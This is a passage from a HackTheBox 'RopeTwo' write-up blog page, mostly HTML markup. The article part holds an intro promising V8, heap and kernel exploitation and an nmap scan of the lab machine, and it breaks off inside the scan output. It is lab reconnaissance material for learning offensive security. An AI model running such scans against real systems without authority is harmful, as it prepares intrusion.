






<!doctype html>
<html
  lang="en"
  dir="ltr"
  class="scroll-smooth"
  data-default-appearance="dark"
  data-auto-appearance="true"
><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="theme-color" content="#FFFFFF" />
  
  <title>HTB: RopeTwo Writeup &middot; PwnFuzz</title>
    <meta name="title" content="HTB: RopeTwo Writeup &middot; PwnFuzz" />
  
  
  
  
  
  <script
    type="text/javascript"
    src="/js/appearance.min.74ad8406faea02f3e186ba5126249aaeed9073629e04b05037b903396b188724.js"
    integrity="sha256-dK2EBvrqAvPhhrpRJiSaru2Qc2KeBLBQN7kDOWsYhyQ="
  ></script>
  
  
  
  
  
  
  
    
  
  
  <link
    type="text/css"
    rel="stylesheet"
    href="/css/main.bundle.min.ca3d76caaadfab05c830305a0574dfec197361ee5b3408fa5ebdcc981b3ab703.css"
    integrity="sha256-yj12yqrfqwXIMDBaBXTf7BlzYe5bNAj6Xr3MmBs6twM="
  />
  
    
    
    
  
  
  
    
    
  
  
    
    
  
  
  
    
    <script
      defer
      type="text/javascript"
      id="script-bundle"
      src="/js/main.bundle.min.0ce71464304b0e7f6f5dc04656b9ff39cbcb7ff30af0a0e1268c1c3147e8ddd8.js"
      integrity="sha256-DOcUZDBLDn9vXcBGVrn/OcvLf/MK8KDhJowcMUfo3dg="
      data-copy="Copy"
      data-copied="Copied"
    ></script>
  
  
  <meta
    name="description"
    content="
      
        This box was without a second thought one of the favourite box of mine on HackTheBox so far, since I am more of a pwn and reverse engineering person, this machine was a challenge, an outstanding one which pushed my learning skills more further because upto the moment I really went into this, I was not a good at heap exploitation, more skeptical about the V8 exploitation skills of mine and of course I knew nothing of the kernel pwn, so this was a way to tackle every weakness of mine, hope you find the writeup useful, I&rsquo;ll include the link of the attachments at the very bottom to my files, QEMU enviornment for the kernel pwn and the exploits, without further ado, let&rsquo;s start.
      
    "
  />
  <meta name="google-site-verification" content="K7KosUi5pj-pvy_N51qyPAbh8V777BqtvVdbUcqNslU" />
  
  
  
  <link rel="canonical" href="http://localhost:1313/posts/ropetwo-hackthebox/" />
  
  
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
    <link rel="manifest" href="/site.webmanifest" />
  
  
  
  
  
  
  
  
  <meta property="og:url" content="http://localhost:1313/posts/ropetwo-hackthebox/">
  <meta property="og:site_name" content="PwnFuzz">
  <meta property="og:title" content="HTB: RopeTwo Writeup">
  <meta property="og:description" content="This box was without a second thought one of the favourite box of mine on HackTheBox so far, since I am more of a pwn and reverse engineering person, this machine was a challenge, an outstanding one which pushed my learning skills more further because upto the moment I really went into this, I was not a good at heap exploitation, more skeptical about the V8 exploitation skills of mine and of course I knew nothing of the kernel pwn, so this was a way to tackle every weakness of mine, hope you find the writeup useful, I’ll include the link of the attachments at the very bottom to my files, QEMU enviornment for the kernel pwn and the exploits, without further ado, let’s start.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2021-01-03T00:00:00+00:00">
    <meta property="article:modified_time" content="2021-01-03T00:00:00+00:00">
    <meta property="article:tag" content="Pwn, Hackthebox, V8, Kernel, Heap, Tcache, Libc-2.29">

  <meta name="twitter:card" content="summary"><meta name="twitter:title" content="HTB: RopeTwo Writeup">
<meta name="twitter:description" content="This box was without a second thought one of the favourite box of mine on HackTheBox so far, since I am more of a pwn and reverse engineering person, this machine was a challenge, an outstanding one which pushed my learning skills more further because upto the moment I really went into this, I was not a good at heap exploitation, more skeptical about the V8 exploitation skills of mine and of course I knew nothing of the kernel pwn, so this was a way to tackle every weakness of mine, hope you find the writeup useful, I&rsquo;ll include the link of the attachments at the very bottom to my files, QEMU enviornment for the kernel pwn and the exploits, without further ado, let&rsquo;s start.">

  
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Posts",
    "name": "HTB: RopeTwo Writeup",
    "headline": "HTB: RopeTwo Writeup",
    
    "abstract": "This box was without a second thought one of the favourite box of mine on HackTheBox so far, since I am more of a pwn and reverse engineering person, this machine was a challenge, an outstanding one which pushed my learning skills more further because upto the moment I really went into this, I was not a good at heap exploitation, more skeptical about the V8 exploitation skills of mine and of course I knew nothing of the kernel pwn, so this was a way to tackle every weakness of mine, hope you find the writeup useful, I\u0026rsquo;ll include the link of the attachments at the very bottom to my files, QEMU enviornment for the kernel pwn and the exploits, without further ado, let\u0026rsquo;s start.",
    "inLanguage": "en",
    "url" : "http:\/\/localhost:1313\/posts\/ropetwo-hackthebox\/",
    "author" : {
      "@type": "Person",
      "name": "Robin (D4mianWayne)"
    },
    "copyrightYear": "2021",
    "dateCreated": "2021-01-03T00:00:00\u002b00:00",
    "datePublished": "2021-01-03T00:00:00\u002b00:00",
    
    "dateModified": "2021-01-03T00:00:00\u002b00:00",
    
    "keywords": ["pwn, hackthebox, v8, kernel, heap, tcache, libc-2.29"],
    
    "mainEntityOfPage": "true",
    "wordCount": "10948"
  }
  </script>


  
  <meta name="author" content="Robin (D4mianWayne)" />
  
    
      <link href="https://twitter.com/D4mianWayne" rel="me" />
    
  
  
  






  
  

  
  
</head>
<body
    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"
  >
    <div id="the-top" class="absolute flex self-center">
      <a
        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
        href="#main-content"
        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
        >Skip to main content</a
      >
    </div>
    
    
      <header class="py-6 font-semibold text-neutral-900 dark:text-neutral sm:py-10 print:hidden">
  <nav class="flex items-start justify-between sm:items-center">
    
    <div class="z-40 flex flex-row items-center">
      
  <a
    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
    rel="me"
    href="/"
    >PwnFuzz</a
  >

    </div>
    
      
      <label id="menu-button" for="menu-controller" class="block sm:hidden">
        <input type="checkbox" id="menu-controller" class="hidden" />
        <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
          <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
</span>
        </div>
        <div
          id="menu-wrapper"
          class="invisible fixed inset-0 z-30 m-auto h-full w-full cursor-default overflow-auto bg-neutral-100/50 opacity-0 backdrop-blur-sm transition-opacity dark:bg-neutral-900/50"
        >
          <ul
            class="mx-auto flex w-full max-w-7xl list-none flex-col overflow-visible px-6 py-6 text-end sm:px-14 sm:py-10 sm:pt-10 md:px-24 lg:px-32"
          >
            <li class="mb-1">
              <span class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400"
                ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
</span></span
              >
            </li>
            
              
                
                <li class="group mb-1">
                  
                    <a
                      href="/posts/"
                      title=""
                      onclick="close_menu()"
                      
                      ><span
                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                          >Blog</span
                        >
                      </a
                    >
                  
                </li>
              
                
                <li class="group mb-1">
                  
                    <a
                      href="/categories/"
                      title=""
                      onclick="close_menu()"
                      
                      ><span
                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                          >Categories</span
                        >
                      </a
                    >
                  
                </li>
              
                
                <li class="group mb-1">
                  
                    <a
                      href="/about/"
                      title=""
                      onclick="close_menu()"
                      
                      ><span
                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                          >About</span
                        >
                      </a
                    >
                  
                </li>
              
                
                <li class="group mb-1">
                  
                    <a
                      href="/tags/"
                      title=""
                      onclick="close_menu()"
                      
                      ><span
                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                          >Tags</span
                        >
                      </a
                    >
                  
                </li>
              
                
                <li class="group mb-1">
                  
                    <a
                      href="https://github.com/D4mianWayne"
                      title=""
                      onclick="close_menu()"
                      target="_blank"
                      >
                        <span
                          class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"
                        ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
</span></span></a
                    >
                  
                </li>
              
                
                <li class="group mb-1">
                  
                    
                    
                      <button
                        id="search-button-1"
                        title="Search (/)"
                      >
                        
                          <span
                            class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"
                          ><span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span></span><span
                            class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                            ></span
                          >
                        
                      </button>
                    
                  
                </li>
              
                
                  
              
            
          </ul>
        </div>
      </label>
      
      <ul class="hidden list-none flex-row text-end sm:flex">
        
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
              
                <a
                  href="/posts/"
                  title=""
                  
                  ><span
                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                      >Blog</span
                    >
                  </a
                >
              
            </li>
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
              
                <a
                  href="/categories/"
                  title=""
                  
                  ><span
                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                      >Categories</span
                    >
                  </a
                >
              
            </li>
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
              
                <a
                  href="/about/"
                  title=""
                  
                  ><span
                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                      >About</span
                    >
                  </a
                >
              
            </li>
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
              
                <a
                  href="/tags/"
                  title=""
                  
                  ><span
                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                      >Tags</span
                    >
                  </a
                >
              
            </li>
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
              
                <a
                  href="https://github.com/D4mianWayne"
                  title=""
                  target="_blank"
                  >
                    <span
                      class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"
                    ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
</span></span></a
                >
              
            </li>
          
            
            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
              
                
                
                  <button
                    id="search-button-2"
                    title="Search (/)"
                  >
                    
                      <span
                        class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"
                      ><span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span></span><span
                        class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                        ></span
                      >
                    
                  </button>
                
              
            </li>
          
            
              
          

        
      </ul>
    
  </nav>
</header>

    
    <div class="relative flex grow flex-col">
      <main id="main-content" class="grow">
        
  <article class="max-w-screen-lg"> 
    <header class="max-w-prose">
      
        <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
  
  
    
  
    
  
  <li class="hidden inline">
    <a
      class="dark:underline-neutral-600 decoration-neutral-300 hover:underline"
      href="/"
      >PwnFuzz</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class=" inline">
    <a
      class="dark:underline-neutral-600 decoration-neutral-300 hover:underline"
      href="/posts/"
      >Posts</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class="hidden inline">
    <a
      class="dark:underline-neutral-600 decoration-neutral-300 hover:underline"
      href="/posts/ropetwo-hackthebox/"
      >HTB: RopeTwo Writeup</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

</ol>


      
      <h1 class="mb-8 mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
        HTB: RopeTwo Writeup
      </h1>
      
        <div class="mb-10 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
          





  
  



  

  
  
    
  

  

  
    
  

  
    
  

  


  <div class="flex flex-row flex-wrap items-center">
    
    
      <time datetime="2021-01-03 00:00:00 &#43;0000 UTC">3 January 2021</time><span class="px-2 text-primary-500">&middot;</span><span>10948 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">52 mins</span>
    

    
    
  </div>

  
  
    <div class="my-1 flex flex-wrap text-xs leading-relaxed text-neutral-500 dark:text-neutral-400">
      
        
          
            <a
              href="/categories/hackthebox/"
              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
              >HackTheBox</a
            >
          
        
      
        
          
            <a
              href="/tags/pwn-hackthebox-v8-kernel-heap-tcache-libc-2.29/"
              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
              >Pwn, Hackthebox, V8, Kernel, Heap, Tcache, Libc-2.29</a
            >
          
        
      
    </div>
  


        </div>
      
      
    </header>
    <section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row">
      
        <div class="order-first px-0 lg:order-last lg:max-w-xs lg:ps-8">
          <div class="toc pe-5 lg:sticky lg:top-10 print:hidden">
            <details open class="-ms-5 mt-0 overflow-hidden rounded-lg ps-5 w-full">
  <summary class="block cursor-pointer bg-neutral-100 py-2 ps-5 text-lg font-semibold text-neutral-800 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div class="border-s border-dotted border-neutral-400 py-4 ps-5 dark:border-neutral-600 w-full font-plex-mono-bold">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#foothold">Foothold</a>
      <ul>
        <li><a href="#v8-exploitation">V8 Exploitation</a></li>
      </ul>
    </li>
    <li><a href="#user">User</a>
      <ul>
        <li><a href="#tcache-heap-exploitation">Tcache Heap Exploitation</a>
          <ul>
            <li>
              <ul>
                <li></li>
              </ul>
            </li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#root">Root</a>
      <ul>
        <li>
          <ul>
            <li>
              <ul>
                <li></li>
              </ul>
            </li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</details>
          </div>
        </div>
      
      <div class="min-h-0 min-w-0 max-w-max grow">
        <p>This box was without a second thought one of the favourite box of mine on HackTheBox so far, since I am more of a pwn and reverse engineering person, this machine was a challenge, an outstanding one which pushed my learning skills more further because upto the moment I really went into this, I was not a good at heap exploitation, more skeptical about the V8 exploitation skills of mine and of course I knew nothing of the kernel pwn, so this was a way to tackle every weakness of mine, hope you find the writeup useful, I&rsquo;ll include the link of the attachments at the very bottom to my files, QEMU enviornment for the kernel pwn and the exploits, without further ado, let&rsquo;s start.</p>
<h1 id="foothold" class="relative group">Foothold <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#foothold" aria-label="Anchor">#</a></span></h1><p>So, as this became kind of obvious that the foothold required the V8 exploitation as the rumors went by. But apart from that, I started scanning the ports as I was unclear myself where and how things are on this machine, now starting off, I used nmap to scan the ports:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">➜</span> <span class="err">✔</span> <span class="nf">nmap</span> <span class="p">-</span><span class="no">sV</span> <span class="p">-</span><span class="no">sC</span> <span class="p">-</span><span class="no">A</span> <span class="mi">10</span><span class="no">.10.10.196</span>
</span></span><span class="line"><span class="cl"><span class="nf">Starting</span> <span class="no">Nmap</span> <span class="mi">7</span><span class="no">.80</span> <span class="p">(</span> <span class="no">https</span><span class="p">:</span><span class="c1">//nmap.org ) at 2021-01-16 21:57 IST
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">Nmap</span> <span class="no">scan</span> <span class="no">report</span> <span class="no">for</span> <span class="mi">10</span><span class="no">.10.10.196</span>
</span></span><span class="line"><span class="cl"><span class="nf">Host</span> <span class="no">is</span> <span class="no">up</span> <span class="p">(</span><span class="mi">0</span><span class="no">.83s</span> <span class="no">latency</span><span class="p">).</span>
</span></span><span class="line"><span class="cl"><span class="nf">Not</span> <span class="no">shown</span><span class="p">:</span> <span class="mi">997</span> <span class="no">closed</span> <span class="no">ports</span>
</span></span><span class="line"><span class="cl"><span class="nf">PORT</span>     <span class="no">STATE</span> <span class="no">SERVICE</span> <span class="no">VERSION</span>
</span></span><span class="line"><span class="cl"><span class="err">22/</span><span class="nf">tcp</span>   <span class="no">open</span>  <span class="no">ssh</span>     <span class="no">OpenSSH</span> <span class="mi">7</span><span class="no">.9p1</span> <span class="no">Ubuntu</span> <span class="mi">10</span> <span class="p">(</span><span class="no">Ubuntu</span> <span class="no">Linux</span><span class="c1">; protocol 2.0)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span> <span class="nl">ssh-hostkey:</span> 
</span></span><span class="line"><span class="cl"><span class="err">|</span>   <span class="err">2048</span> <span class="nl">bc:d9:</span><span class="err">40:18:5</span><span class="nl">e:</span><span class="err">2</span><span class="nl">b:</span><span class="err">2</span><span class="nl">b:</span><span class="err">12:3</span><span class="nl">d:</span><span class="err">0</span><span class="nl">b:</span><span class="err">1</span><span class="nl">f:f3:</span><span class="err">6</span><span class="nl">f:</span><span class="err">03:1</span><span class="nl">b:</span><span class="err">8</span><span class="nf">f</span> <span class="p">(</span><span class="no">RSA</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span>   <span class="err">256</span> <span class="err">15:23:6</span><span class="nl">f:a6:d8:</span><span class="err">13:6</span><span class="nl">e:c4:</span><span class="err">5</span><span class="nl">b:c5:</span><span class="err">4</span><span class="nl">a:</span><span class="err">6</span><span class="nl">f:</span><span class="err">5</span><span class="nl">a:</span><span class="err">6</span><span class="nl">b:</span><span class="err">0</span><span class="nl">b:</span><span class="err">4</span><span class="nf">d</span> <span class="p">(</span><span class="no">ECDSA</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span><span class="nf">_</span>  <span class="mi">256</span> <span class="mi">83</span><span class="p">:</span><span class="mi">44</span><span class="p">:</span><span class="no">a5</span><span class="p">:</span><span class="no">b4</span><span class="p">:</span><span class="mi">88</span><span class="p">:</span><span class="no">c2</span><span class="p">:</span><span class="no">e9</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">6</span><span class="no">a</span><span class="p">:</span><span class="no">da</span><span class="p">:</span><span class="mi">9</span><span class="no">e</span><span class="p">:</span><span class="no">a8</span><span class="p">:</span><span class="mi">3</span><span class="no">a</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">90</span> <span class="p">(</span><span class="no">ED25519</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">5000/</span><span class="nf">tcp</span> <span class="no">open</span>  <span class="no">http</span>    <span class="no">nginx</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="nl">http-robots.txt:</span> <span class="err">55</span> <span class="nf">disallowed</span> <span class="no">entries</span> <span class="p">(</span><span class="mi">15</span> <span class="no">shown</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">/</span> <span class="err">/</span><span class="nf">autocomplete</span><span class="err">/</span><span class="no">users</span> <span class="err">/</span><span class="no">search</span> <span class="err">/</span><span class="no">api</span> <span class="err">/</span><span class="no">admin</span> <span class="err">/</span><span class="no">profile</span> 
</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="err">/</span><span class="no">dashboard</span> <span class="err">/</span><span class="no">projects</span><span class="err">/</span><span class="no">new</span> <span class="err">/</span><span class="no">groups</span><span class="err">/</span><span class="no">new</span> <span class="err">/</span><span class="no">groups</span><span class="cm">/*/edit /users /help 
</span></span></span><span class="line"><span class="cl"><span class="cm">|_/s/ /snippets/new /snippets/*/</span><span class="nf">edit</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span> <span class="nl">http-title:</span> <span class="nf">Sign</span> <span class="no">in</span> <span class="err">\</span><span class="no">xC2</span><span class="err">\</span><span class="no">xB7</span> <span class="no">GitLab</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span><span class="nf">_Requested</span> <span class="no">resource</span> <span class="no">was</span> <span class="no">http</span><span class="p">:</span><span class="c1">//10.10.10.196:5000/users/sign_in
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">|</span><span class="nl">_http-trane-info:</span> <span class="nf">Problem</span> <span class="no">with</span> <span class="no">XML</span> <span class="no">parsing</span> <span class="no">of</span> <span class="err">/</span><span class="no">evox</span><span class="err">/</span><span class="no">about</span>
</span></span><span class="line"><span class="cl"><span class="err">8000/</span><span class="nf">tcp</span> <span class="no">open</span>  <span class="no">http</span>    <span class="no">Werkzeug</span> <span class="no">httpd</span> <span class="mi">0</span><span class="no">.14.1</span> <span class="p">(</span><span class="no">Python</span> <span class="mi">3</span><span class="no">.7.3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span><span class="nl">_http-server-header:</span> <span class="nf">Werkzeug</span><span class="err">/</span><span class="mi">0</span><span class="no">.14.1</span> <span class="no">Python</span><span class="err">/</span><span class="mi">3</span><span class="no">.7.3</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span><span class="nl">_http-title:</span> <span class="nf">Home</span>
</span></span><span class="line"><span class="cl"><span class="nf">Service</span> <span class="no">Info</span><span class="p">:</span> <span class="no">OS</span><span class="p">:</span> <span class="no">Linux</span><span class="c1">; CPE: cpe:/o:linux:linux_kernel
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="nf">Service</span> <span class="no">detection</span> <span class="no">performed.</span> <span class="no">Please</span> <span class="no">report</span> <span class="no">any</span> <span class="no">incorrect</span> <span class="no">results</span> <span class="no">at</span> <span class="no">https</span><span class="p">:</span><span class="c1">//nmap.org/submit/ .
